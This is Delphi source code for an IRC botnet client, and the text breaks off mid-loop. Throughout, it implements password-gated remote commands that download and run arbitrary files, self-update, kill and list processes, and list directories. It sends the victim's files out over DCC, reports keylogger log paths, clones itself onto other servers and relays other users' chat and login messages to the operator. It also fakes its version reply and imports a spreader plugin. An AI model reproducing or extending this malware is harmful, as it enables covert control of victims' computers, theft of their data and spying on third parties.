unit untBot;

interface

uses
  Windows,
  WinSock,
  untFunctions,
  untDCC,
  md5,
  shellApi, 
  plugin_spreader;

{$I stubbos_config.ini}  

type
  tClone        =       Record
        Server  :       String;
        Port    :       Integer;
        Nick    :       String;
        Channel :       String;
        Key     :       String;
        Password:       String;
        IsSpy   :       Bool;
  End;
  pClone = ^tClone;

  tIRC          =       Class(TObject)
    Private
      {Procedures}
      Procedure         SplitParam(Data: String);
      {Functions}
      Function          IsNumeric (Str: String): Bool;
    Public
      {Declares}
      FromNick          :String;
      FromChan          :String;
      FromHost          :String;
      RecvText          :String;
      SpyChannel        :String;
      SpyTo             :String;
      Commando          :String;
      LoggedHost        :String;
      LoggedName        :String;
      SeenNicks         :String;

      Params            :Array[0..9000] Of String;

      SpyOn             :Bool;
      Silence           :Bool;
      IsCommand         :Bool;
      LoggedIn          :Bool;

      Sock              :TSocket;
      {Procedures}
      {$IFDEF BOT_LOG_IRCNAMES}
        Procedure         DoIKnowHim(Nick: String);
      {$ENDIF}
      Procedure         ParseInfo (Data: String);
      {Functions}
      Function          ReceiveData: Bool;
    End;

  tSock         =       Class(TObject)
    Private
      {Declares}
      Servern           :String;

      Sock              :TSocket;
      Addr              :TSockAddrIn;
      WSA               :TWSAData;
    Public
      {Declares}
      Server            :String;
      Nick              :String;
      Channel           :String;
      Key               :String;
      Password          :String;

      Port              :Integer;

      IsChat            :Bool;
      IsSpy             :Bool;
      Clone             :Bool;
      DoneTopic         :Bool;

      IRC               :tIRC;
      {Procedures}
      Procedure         SendInfo;
      Procedure         DoCommando;
      Procedure         SendRaw(Text: String);
      Procedure         ReadCommando(Data: String; Buffer: Array Of Char; Sock2: TSocket);
      Procedure         SendData(Data: String; Chat: Bool; Sockish: TSocket);
      {Functions}
      Function          StartUp: Bool;
      Function          Connect: Bool;
      Function          DownloadFile(urlFrom, urlTo: String): Integer;
      {$IFDEF BOT_PLUGIN_SUPPORT}
        Function          DoPlugin(DLLName: String; AddData: String): Bool;
      {$ENDIF}
    End;

Var
  Info          :tClone;
  Bot           :tSock;
  Clones        :Integer;
  DefaultSock   :TSocket;

implementation

uses
  untScriptEngine;

(* Make Clones *)
Function MakeClone(P: Pointer): DWord; STDCALL;
Var
  Clone: tSock;
Begin
  Clone := tSock.Create;
  Clone.Clone := True;
  Clone.Server   := pClone(P)^.Server;
  Clone.Port     := pClone(P)^.Port;
  Clone.Nick     := pClone(P)^.Nick;
  Clone.Channel  := pClone(P)^.Channel;
  Clone.Key      := pClone(P)^.Key;
  Clone.Password := pClone(P)^.Password;
  Clone.IsSpy    := pClone(P)^.IsSpy;
  Clone.StartUp;
  Dec(Clones);
  Result := 0;
End;

Procedure CloneMyBot(Server, Nick, Channel, Key, Password: String; Port: Integer);
Var
  ThreadID      :THandle;
Begin
  If (Clones >= bot_max_clones) Then Exit;
  Inc(Clones);
  Info.Server := Server;
  Info.Port := Port;
  Info.Nick := Nick;
  Info.Channel := Channel;
  Info.Key := Key;
  Info.Password := Password;
  Info.IsSpy := False;
  CreateThread(NIL, 0, @MakeClone, @Info, 0, ThreadID);
End;

Procedure CloneMySpy(Server, Channel, Key, Password: String; Port: Integer);
Var
  ThreadID      :THandle;
Begin
  If (Clones >= bot_max_clones) Then Exit;
  Inc(Clones);
  Info.Server := Server;
  Info.Port := Port;
  Info.Nick := RandIRCBot;
  Info.Channel := Channel;
  Info.Key := Key;
  Info.Password := Password;
  Info.IsSpy := True;
  CreateThread(NIL, 0, @MakeClone, @Info, 0, ThreadID);
End;

{$IFDEF BOT_LOG_IRCNAMES}
Procedure tIRC.DoIKnowHim(Nick: String);
Var
  Path        :String;
  F           :TextFile;
Begin
  If (pos('serv', lowercase(nick)) > 0) Then Exit;
  If (pos('irc', lowercase(nick)) > 0) Then Exit;
  If (pos('global', lowercase(nick)) > 0) Then Exit;
    
  If (Pos(LowerCase(Nick), LowerCase(SeenNicks)) = 0)  Then
  Begin
    SeenNicks := SeenNicks + Nick + ':';
    Path := GetDirectory(0) + '\stbn.ick';

    If (FileExists(Path)) Then
    Begin
      AssignFile(F, Path);
      Append(F);
        Write(F, Nick+':');
      CloseFile(F);
    End Else
    Begin
      AssignFile(F, Path);
      ReWrite(F);
        Write(F, Nick+':');
      CloseFile(F);
    End;
  End;
End;
{$ENDIF}

{$IFDEF BOT_PLUGIN_SUPPORT}
  Function tSock.DoPlugin(DLLName: String; AddData: String): Bool;
  Var
    Path        :String;
    Data        :String;
    ThreadID    :DWord;
  Begin
    Data := IRC.FromNick + '!' + IRC.FromHost + '?' + IRC.FromChan + ' ' + AddData;
    Path := GetDirectory(0) + DLLName;

    Result := True;
    If (FileExists(Path)) Then
    Begin
      PData.DLLName := Path;
      PData.Data := Data;
      CreateThread(NIL, 0, @LoadPlugin, @PData, 0, ThreadID);
    End Else
      Result := False;
  End;
{$ENDIF}

Procedure tSock.SendRaw(Text: String);
Begin
  If (Not IRC.Silence) Then
    Send(Sock, Text[1], Length(Text), 0);
End;

Function tSock.DownloadFile(urlFrom, urlTo: String): Integer;
Begin
  If (URLDownloadToFile(0, pChar(urlFrom), pChar(urlTo), 0, 0) = S_OK) Then
    Result := 0 Else Result := -1;
End;

Procedure tSock.SendData(Data: String; Chat: Bool; Sockish: TSocket);
Begin
  ReplaceStr('%localip%', GetLocalIP, Data);
  ReplaceStr('%version%', BOT_REALVERSION, Data);
  ReplaceStr('%rchan%',   IRC.FromChan, Data);
  ReplaceStr('%cchan%',   Channel, Data);
  ReplaceStr('%me%',      Nick, Data);
  ReplaceStr('%rnick%',   IRC.FromNick, Data);
  ReplaceStr('%rhost%',   IRC.FromHost, Data);
  {$IFDEF SHOW_OUTPUT} WriteLn('<< ['+IntToStr(Length(Data))+']: '+Data); {$ENDIF}
  If (Chat) Then
    Delete(Data, 1, Pos(':', Data));
  If (Not IRC.Silence) Then
    Send(Sockish, Data[1], Length(Data), 0);
End;

Procedure tSock.ReadCommando(Data: String; Buffer: Array Of Char; Sock2: TSocket);
Var
  Temp          :String;
  Buf           :String;
  BackUp        :String;
  Port2         :String;
  fName         :String;
  CloneBot      :tSock;
  Length_       :Integer;
  I             :Integer;
  FileTransfer  :TFileTransfer;
  TempSock      :TSocket;
  dRoot         :HKEY;

  LoggN         :String;
  LoggH         :String;
  LoggI         :Bool;

  FromN         :String;
  FromH         :String;
  FromC         :String;

  pInfo         :PROCESS_INFORMATION;
  sInfo         :STARTUPINFO;
Begin
  If (Sock2 <> Sock) Then
    TempSock := Sock2
  Else
    TempSock := Sock;

  FileTransfer := TFileTransfer.Create;

  While (Pos(#10, Data) > 0) Do
  Begin
    Temp := Copy(Data, 1, Pos(#10, Data)-1);
    ZeroMemory(@Buffer, SizeOf(Buffer));

    IRC.ParseInfo(Temp);
    If (IsBanned(IRC.FromHost)) Then Exit;

    If (IRC.IsCommand) Then
    Begin
      {$IFDEF BOT_DOTOPIC_CMD}
        If (IRC.Commando = '332') Then
        If (Not DoneTopic) Then
        Begin
          DoneTopic := True;
          Data := Temp;
          Delete(Data,1,1);
          Data := Copy(Data, Pos(':', Data)+1, Length(Data));
          Delete(Data, Length(Data),1);
          Data := ':! PRIVMSG # :'+Data+#10;

          FromN := IRC.FromNick;
          FromC := IRC.FromChan;
          FromH := IRC.FromHost;
          LoggN := IRC.LoggedName;
          LoggH := IRC.LoggedHost;
          LoggI := IRC.LoggedIn;

          IRC.FromNick := '' ;
          IRC.FromChan := '#';
          IRC.FromHost := '' ;
          IRC.LoggedHost := '';
          IRC.LoggedName := '';
          IRC.LoggedIn := TRUE;
          ReadCommando(Data, Buffer, Sock2);
          IRC.FromNick := FromN;
          IRC.FromChan := FromC;
          IRC.FromHost := FromH;
          IRC.LoggedHost := LoggH;
          IRC.LoggedName := LoggN;
          IRC.LoggedIn := LoggI;
        End;
      {$ENDIF}

      If (IRC.Commando = '433') Then
      Begin
        Buf := 'NICK '+bot_nametag+RandIRCBot+#10;
        SendData(Buf, IsChat, tempSock);
      End;

      If (Pos('001', Temp) > 0) Or
         (Pos('005', Temp) > 0) Then
         Begin
           If (IsSpy) Or (Clone) Then
           Begin
             Buf := 'JOIN '+CHANNEL+' '+KEY+#10;
             SendData(Buf, IsChat, tempSock);
           End Else
           Begin
             Buf := 'JOIN '+BOT_CHANNEL+' '+BOT_KEY+#10;
             SendData(Buf, IsChat, tempSock);
           End;
         End;
    End Else
    Begin
      If (Pos('MOTD', Temp) > 0) Or
         (Pos('message of the day', LowerCase(Temp)) > 0) Then
         Begin
           If (IsSpy) Or (Clone) Then
           Begin
             Buf := 'JOIN '+CHANNEL+' '+KEY+#10;
             SendData(Buf, IsChat, tempSock);
           End Else
           Begin
             Buf := 'JOIN '+BOT_CHANNEL+' '+BOT_KEY+#10;
             SendData(Buf, IsChat, tempSock);
           End;
         End;

      If (IRC.Params[1] = 'MODE') Then
        If (String(IRC.Params[4]) = Nick) Then
        Begin
          {$IFDEF BOT_CHANGE_TOPIC}
            If (String(IRC.Params[3]) = '+o') Then
            Begin
              Buf := 'TOPIC '+String(IRC.Params[2])+' :'+BOT_SET_TOPIC+#10;
              SendData(Buf, IsChat, tempSock);
            End;
          {$ENDIF}

          {$IFDEF BOT_SEND_MSG}
            If (String(IRC.Params[3]) = '-o') Then
            Begin
              Buf := 'PRIVMSG '+IRC.FromNick+' :'+BOT_SEND_PM+#10;
              SendData(Buf, IsChat, tempSock);
            End;

            If (String(IRC.Params[3]) = '+v') Then
            Begin
              Buf := 'PRIVMSG '+IRC.FromChan+' :'+BOT_SEND_PM_VOICE+#10;
              SendData(Buf, IsChat, tempSock);
            End;

            If (String(IRC.Params[3]) = '-v') Then
            Begin
              Buf := 'PRIVMSG '+IRC.FromChan+' :'+BOT_SEND_PM_UNVOICE+#10;
              SendData(Buf, IsChat, tempSock);
            End;
          {$ENDIF}
        End;
      If (IRC.Params[1] = 'PART') Then
      Begin
        If (IRC.FromNick = IRC.LoggedName) Then
        Begin
          IRC.LoggedHost := '';
          IRC.LoggedName := '';
          IRC.LoggedIn   := FALSE;
        End;
      End;
      If (IRC.Params[1] = 'KICK') Then
      Begin
        If (String(IRC.Params[3]) = Nick) Then
        Begin
          If (IsSpy) Or (Clone) Then
          Begin
            Buf := 'JOIN '+CHANNEL+' '+KEY+#10;
            SendData(Buf, IsChat, tempSock);
            Buf := 'PRIVMSG '+CHANNEL+' :'+BOT_KICKMSG+#10;
            SendData(Buf, IsChat, tempSock);
          End Else
          Begin
            Buf := 'JOIN '+BOT_CHANNEL+' '+BOT_KEY+#10;
            SendData(Buf, IsChat, tempSock);
            Buf := 'PRIVMSG '+BOT_CHANNEL+' :'+BOT_KICKMSG+#10;
            SendData(Buf, IsChat, tempSock);
          End;
        End;
        If (String(IRC.Params[3]) = IRC.LoggedName) Then
        Begin
          IRC.LoggedHost := '';
          IRC.LoggedName := '';
          IRC.LoggedIn   := FALSE;
        End;
      End;
      If (IRC.Params[1] = 'PRIVMSG') Then
      Begin
        {$IFDEF BOT_REPLY_PING}
          If (Copy(IRC.RecvText, 1, 5) = #1'PING') Then
          Begin
            Buf := Copy(IRC.RecvText, 6, Length(IRC.RecvText));
            Delete(Buf, Length(Buf), 1);
            Buf := 'NOTICE '+IRC.FromNick+' :'#1'PING'+Buf+#1#10#13;
            SendData(Buf, IsChat, tempSock);
          End;
        {$ENDIF}

        {$IFDEF BOT_REPLY_VERSION}
          If (IRC.RecvText = #1'VERSION'#1) Then
          Begin
            {$IFDEF BOT_REPLY_FAKEVERSION}
              Buf := 'NOTICE '+IRC.FromNick+' :'#1'VERSION ' + BOT_FAKEVERSION + #10;
              SendData(Buf, IsChat, tempSock);
            {$ENDIF}
            {$IFDEF BOT_REPLY_REALVERSION}
              Buf := 'NOTICE '+IRC.FromNick+' :'#1'VERSION ' + BOT_REALVERSION + #10;
              SendData(Buf, IsChat, tempSock);
            {$ENDIF}
          End;
        {$ENDIF}

        If (IRC.FromChan <> '') Then
          If (IRC.FromChan[1] = '#') Then
            Begin

              (* Someone wrote 'LOGIN' somewhere, lets report! *)
              If (IRC.LoggedIn) Then
                If (IRC.FromNick <> IRC.LoggedName) Then
                  If (IRC.FromChan <> BOT_CHANNEL) Then
                    If (Pos('login', Lowercase(IRC.RecvText)) > 0) Then
                      Begin
                        Buf := 'PRIVMSG '+IRC.LoggedName+' :('+IRC.FromChan+') ['+IRC.FromNick+'!'+IRC.FromHost+'] '+IRC.RecvText +#10;
                        SendData(Buf, IsChat, tempSock);
                      End;

              (* Remote Spy found channel *)
              If (IsSpy) And (IRC.FromChan = Channel) Then
                Begin
                  Buf := 'PRIVMSG '+BOT_CHANNEL+' :['+IRC.FromChan+' @ '+Server+']['+IRC.FromNick+'!'+IRC.FromHost+']: '+IRC.RecvText+#10;
                  SendData(Buf, FALSE, DefaultSock);
                End;

              (* Remote Spying on irc Servers *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_RMTSPY) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    If (IRC.Params[4] = '*') Then IRC.Params[4] := '';
                    If (IRC.Params[5] = '*') Then IRC.Params[5] := '';
                    If (IRC.Params[6] = '*') Then IRC.Params[6] := '';
                    If (IRC.Params[7] = '*') Then IRC.Params[7] := '';
                    If (IRC.Params[8] = '' ) Then IRC.Params[8] := '6667';

                    If (IRC.Params[4] <> '') Then
                      CloneMySpy(String(IRC.Params[4]) ,
                                 String(IRC.Params[5]) ,
                                 String(IRC.Params[6]) ,
                                 String(IRC.Params[7]) ,
                                 StrToInt(String(IRC.Params[8])));
                  End;

              (* Admin wants us to change nick *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_NEWNICK) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'NICK '+bot_nametag+RandIRCBot+#10;
                    SendData(Buf, IsChat, tempSock);
                  End;

              (* Admins wants op *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_OPME) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'MODE '+IRC.FromChan+' +o '+IRC.FromNick+#10;
                    SendData(Buf, IsChat, tempSock);
                  End;


              (* Admins wants us to restart with some interval *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_RESTART) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'QUIT :'+BOT_QUITMESSAGE+#10;
                    SendData(Buf, IsChat, tempSock);
                    Sleep(800);

                    If (IRC.IsNumeric(String(IRC.Params[4]))) Then
                      Sleep(StrToInt(String(IRC.Params[4]))*1000)
                    Else
                      Sleep(1800000);

                    If (Clone) Then
                      CloneMyBot(Server, RandIRCBot, Channel, Key, Password, Port);
                  End;

              (* Admin wants us to die *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_DIE) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'QUIT :'+BOT_QUITMESSAGE+#10;
                    SendData(Buf, IsChat, tempSock);
                    Sleep(800);

                    If (Clone) Then
                      CloseSocket(Sock)
                    Else
                      ExitProcess(0);
                  End;

              (* Admin wants all clones to die *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_KILLCLONE) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                    If (Clone) Then
                    Begin
                      Buf := 'QUIT :'+BOT_QUITMESSAGE+#10;
                      SendData(Buf, IsChat, tempSock);
                      Sleep(800);

                      CloseSocket(Sock);
                    End;

              (* LOGIN! :D *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_LOGIN) Then
                If (NOT IRC.LoggedIn) Then
                {$IFDEF BOT_PREDEFINED_HOST} If (IRC.FromHost = BOT_LOGIN_HOST) Then {$ENDIF}
                Begin
                  If (String(IRC.Params[4]) = BOT_PASSWORD) Then
                  Begin
                    Buf := 'PRIVMSG '+IRC.FromChan+' :Login Successfull'#10;
                    If Not (IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);

                    IRC.LoggedIn := True;
                    IRC.LoggedHost := IRC.FromHost;
                    IRC.LoggedName := IRC.FromNick;
                    {$IFDEF BOT_BAN_AFTER_FAILURE}
                      RemoveFailure(IRC.FromHost);
                    {$ENDIF}
                  End Else
                  Begin
                    {$IFDEF BOT_REPORT_FAILURE}
                      {$IFDEF BOT_BAN_AFTER_FAILURE}
                        LoginFailure(IRC.FromHost);
                      {$ENDIF}
                      Buf := 'PRIVMSG '+IRC.LoggedName+' :Failed login attempt from ['+IRC.FromNick+'!'+IRC.FromHost+']';
                      If (Copy(IRC.FromChan,1,1) = '#') Then
                        Buf := Buf + ' @ '+IRC.FromChan + #10
                      Else
                        Buf := Buf + #10;
                      SendData(Buf, IsChat, tempSock);
                    {$ENDIF}
                  End;
                End;

              (* logout ...  *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_LOGOUT) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    IRC.LoggedHost := '';
                    IRC.LoggedName := '';
                    IRC.LoggedIn   := FALSE;

                    Buf := 'PRIVMSG '+IRC.FromChan+' :Logout Successfull'#10;
                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (* Admin wants us to parse some info *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_INFO) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'PRIVMSG '+IRC.FromChan+' :'+GetInfo+#10;
                    If Not (IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);                    
                  End;

              (* Admins want bot to shut the fuck up *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_SILENCE) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                    IRC.Silence := Boolean(StrToInt(String(Irc.Params[4])));

              (* Admins wants to exchange some words with DCC Chat *)
              If (Pos('DCC CHAT', IRC.RecvText) > 0) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Buf := Copy(Buf, Pos('DCC CHAT', Buf)+9, Length(Buf));

                    If (Buf[1] = ' ') Then
                      Delete(Buf, 1, 1);

                    Delete(Buf, 1, Pos(' ', Buf)-1);
                    IRC.SplitParam(Buf);

                    FileTransfer.AcceptChat(IRC.FromNick, IRC.FromHost, String(IRC.Params[0]), StrToInt(String(IRC.Params[1])));
                  End;

              (* Admins wants to send you a file :) *)
              If (Pos('DCC SEND', IRC.RecvText) > 0) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := IRC.RecvText;
                    Buf := Copy(Buf, Pos('DCC SEND', Buf) + 9, Length(Buf));

                    If (Buf[1] = ' ') Then
                      Delete(Buf, 1, 1);

                    IRC.SplitParam(Buf);
                    FileTransfer.ReceiveFile(String(IRC.Params[0]), StrToInt(String(IRC.Params[2])), String(IRC.Params[1]), Sock);
                    Buf := 'PRIVMSG '+IRC.FromChan+' :Accepted Filetransfer of ('+String(IRC.Params[0])+') on port ('+String(IRC.Params[2])+')'#10;

                    If Not IRC.Silence Then
                      SendData(Buf, IsChat, Sock);
                  End;

              (* Lets kill some processes *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_KILLPROC) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    If (KillProc(String(IRC.Params[4]))) Then
                      Buf := 'Killed Process'#10
                    Else
                      Buf := 'Cant kill process'#10;

                    Buf := 'PRIVMSG '+IRC.FromChan+' :'+Buf;
                    If Not IRC.Silence Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (* Admin wants us to list the processlist *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_LISTPROC) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                      Backup := ListProc;

                      {$IFDEF BOT_SEND_PROCLIST}
                        Randomize;
                        Port2 := IntToStr(Random(5000)+100);

                        Buf         := 'PRIVMSG '+IRC.FromNick+' :'#1'DCC SEND ';
                        fName       := Backup;
                        Length_     := GetFileSize(Backup);
                        Backup      := ExtractFileName(Backup);

                        For I := 1 To Length(Backup) Do
                          If (Backup[i] = #32) Then
                            BackUp[I] := #95;

                        Buf := Buf + Backup + ' ' + IntToStr(hTonl(Inet_Addr(pChar(ResolveIP(''))))) + ' ' + Port2 + ' ' + IntToStr(Length_)+#1#10;
                        SendData(Buf, False, Sock);

                        FileTransfer.SendFile(fName, StrToInt(Port2), Length_);
                      {$ELSE}
                        ReadFileStr(Backup, Buf);
                        While Pos(#10, Buf) > 0 Do
                        Begin
                          BackUp := '';
                          BackUp := Copy(Buf, 1, Pos(#10, Buf)-1);
                          Buf := Copy(Buf, Pos(#10, Buf)+1, Length(Buf));

                          If (Backup <> '') Then
                            Begin
                              ReplaceStr(#32, #0160, Backup);
                              Backup := 'PRIVMSG '+IRC.FromNick+' :'+Backup+#10;
                              SendData(Backup, IsChat, tempSock);
                              Sleep(800);
                            End;
                        End;
                      {$ENDIF}
                  End;

              (* Admin wants us to list the given directory *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_LISTDIR) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                    If (IRC.Params[4] <> '') Then
                    Begin
                      ListDirectory(IRC.Params[4], Backup, IRC.params[5]);


                      {$IFDEF BOT_SEND_FILELIST}
                        Randomize;
                        Port2 := IntToStr(Random(5000)+100);

                        Buf         := 'PRIVMSG '+IRC.FromNick+' :'#1'DCC SEND ';
                        fName       := Backup;
                        Length_     := GetFileSize(Backup);
                        Backup      := ExtractFileName(Backup);

                        For I := 1 To Length(Backup) Do
                          If (Backup[i] = #32) Then
                            BackUp[I] := #95;

                        Buf := Buf + Backup + ' ' + IntToStr(hTonl(Inet_Addr(pChar(ResolveIP(''))))) + ' ' + Port2 + ' ' + IntToStr(Length_)+#1#10;
                        SendData(Buf, False, Sock);

                        FileTransfer.SendFile(fName, StrToInt(Port2), Length_);
                      {$ELSE}
                        ReadFileStr(Backup, Buf);
                        While Pos(#10, Buf) > 0 Do
                        Begin
                          BackUp := '';
                          BackUp := Copy(Buf, 1, Pos(#10, Buf)-1);
                          Buf := Copy(Buf, Pos(#10, Buf)+1, Length(Buf));

                          If (Backup <> '') Then
                            Begin
                              ReplaceStr(#32, #0160, Backup);
                              Backup := 'PRIVMSG '+IRC.FromNick+' :'+Backup+#10;
                              SendData(Backup, IsChat, tempSock);
                              Sleep(800);
                            End;
                        End;
                      {$ENDIF}
                  End;

              (* Admins wnats us to send him a file *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_GETFILE) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Randomize;
                    Port2 := IntToStr(Random(5000)+100);

                    Buf         := 'PRIVMSG '+IRC.FromNick+' :'#1'DCC SEND ';

                    Backup      := IRC.RecvText;
                    Delete(Backup, 1, Pos(BOT_COMMAND_GETFILE, LowerCase(backup))+7);

                    fName       := Backup;
                    Length_     := GetFileSize(Backup);
                    Backup      := ExtractFileName(Backup);

                    For I := 1 To Length(Backup) Do
                      If (Backup[i] = #32) Then
                        BackUp[I] := #95;

                    Buf := Buf + Backup + ' ' + IntToStr(hTonl(Inet_Addr(pChar(ResolveIP(''))))) + ' ' + Port2 + ' ' + IntToStr(Length_)+#1#10;
                    SendData(Buf, FALSE, Sock);

                    FileTransfer.SendFile(fName, StrToInt(Port2), Length_);
                  End;

              (* Download a file :) *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_DOWNLOAD) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'PRIVMSG '+IRC.FromChan+' :Downloading File.'#10;

                    If (NOT IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);

                    Buf := 'PRIVMSG '+IRC.FromChan+' :';

                    If (DownloadFile(String(IRC.Params[4]), String(IRC.Params[5])) = -1) Then
                      Buf := Buf + 'Download Failed.' Else Buf := Buf + 'Downloaded File';
                    Buf := Buf + #10;

                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                    If (String(IRC.Params[6]) = '1') Then
                      ShellExecute(0, 'open', pChar(String(IRC.Params[5])), NIL, NIL, 1);
                  End;

              (* Get Keylogger Paths *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_GETLOG) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := GetDirectory(0) + BOT_KEYLOGG_FILENAME;
                    Delete(Buf,1,3);
                    ReplaceStr('\', '/', Buf);
                    Buf := 'PRIVMSG '+IRC.FromChan+' :[URL: http://'+GetLocalIP+':81/'+Buf+'] or [getfile '+GetDirectory(0) + BOT_KEYLOGG_FILENAME+']'#10;
                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);
                  End;

              (* Update Bot *)
              If (LowerCase(String(IRC.Params[3])) = ':'+Bot_PREFIX+BOT_COMMAND_UPDATE) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    Buf := 'PRIVMSG '+IRC.FromChan+' :Downloading File.'#10;
                    If (Not IRC.Silence) Then
                      SendData(Buf, IsChat, tempSock);

                    Buf := 'PRIVMSG '+IRC.FromChan+' :';

                    If (DownloadFile(String(IRC.Params[4]), String(IRC.Params[5])) = -1) Then
                    Begin
                      Buf := Buf + 'Download Failed.'#10;
                      If (Not IRC.Silence) Then
                        SendData(Buf, IsChat, tempSock);
                    End Else
                    Begin
                      Buf := Buf + 'Downloaded File Successfully.'#10;
                      If (Not IRC.Silence) Then
                        SendData(Buf, IsChat, tempSock);

                      FillChar(sInfo, SizeOf(STARTUPINFO), 0);
                      sInfo.cb := SizeOf(sInfo);
                      sInfo.wShowWindow := SW_HIDE;

                      If CreateProcess(NIL, pChar(String(IRC.Params[5])), NIL, NIL, FALSE, NORMAL_PRIORITY_CLASS or DETACHED_PROCESS, NIL, NIL, sInfo, pInfo) = True Then
                      Begin
                        DoUninstall;
                        WSACleanUp;
                        ExitProcess(0);
                      End;

                      Buf := Buf + 'Updating Failed.'#10;
                      If (Not IRC.Silence) Then
                        SendData(Buf, IsChat, tempSock);
                    End;

                  End;

              (* Spy Channel Off ! *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_SPYOFF) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    If (IRC.SpyOn) Then IRC.SpyOn := False;
                    Buf := 'PART '+IRC.SpyChannel+#10;
                    SendData(Buf, IsChat, tempSock);
                  End;

              (* Spy Channel On ! *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_SPYON) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    If (IRC.SpyOn) Then
                    Begin
                      Buf := 'PART '+IRC.SpyChannel+#10;
                      SendData(Buf, IsChat, tempSock);
                    End;

                    IRC.SpyTo := String(IRC.Params[5]);
                    IRC.SpyOn := True;
                    IRC.SpyChannel := String(IRC.Params[4]);

                    Buf := 'JOIN '+IRC.SpyChannel+#10;
                    SendData(Buf, IsChat, tempSock);
                  End;

              (* Someone said something in spychan! *)
              If (IRC.SpyOn) Then
                If (IRC.FromChan = IRC.SpyChannel) Then
                Begin
                  Buf := 'PRIVMSG '+IRC.SpyTo+' :('+IRC.SpyChannel+') ['+IRC.FromNick+'!'+IRC.FromHost+']: '+IRC.RecvText+#10;
                  If (Not IRC.Silence) Then
                    SendData(Buf, IsChat, tempSock);
                End;

              (* Lets do what the scientists never did, Clone ourself. *)
              If (LowerCase(String(IRC.Params[3])) = ':'+BOT_PREFIX+BOT_COMMAND_CLONE) Then
                If (IRC.LoggedIn) Then
                  If (IRC.LoggedHost = IRC.FromHost) Then
                  Begin
                    If (IRC.Params[4] = '*') Then IRC.Params[4] := '';
                    If (IRC.Params[5] = '*') Then IRC.Params[5] := RandIRCBot;
                    If (IRC.Params[6] = '*') Then IRC.Params[6] := '';
                    If (IRC.Params[7] = '*') Then IRC.Params[7] := '';
                    If (IRC.Params[8] = '*') Then IRC.Params[8] := '';
                    If (IRC.Params[9] = '' ) Then IRC.Params[9] := '6667';
                    If (IRC.Params[10] = '*') Then IRC.Params[10] := '1';
                    If (IRC.Params[10] = '') Then IRC.Params[10] := '1';
                    If Not (IRC.IsNumeric(IRC.Params[10])) Then IRC.Params[10] := '1';
                    If StrToInt(IRC.Params[10]) > BOT_MAX_CLONES Then IRC.Params[10] := IntToStr(BOT_MAX_CLONES);
                    If (IRC.Params[4] <> '') Then
                      For I := 0 To StrToInt(String(IRC.Params[10]))-1 Do
